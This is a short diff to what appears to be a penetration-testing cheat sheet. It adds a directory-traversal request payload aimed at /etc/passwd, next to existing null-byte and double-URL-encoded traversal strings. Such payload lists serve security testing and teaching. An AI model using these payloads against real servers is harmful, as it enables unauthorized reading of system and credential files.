@@ -482,6 +482,8 @@ Directory Traversal
 can encode url one time or two times or three times
 ../../../etc/passwd%00.png
 
+GET /css///..//..//..//..//..//..//..//..//..//..//../etc/passwd
+
 
 /%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/etc/passwd
 
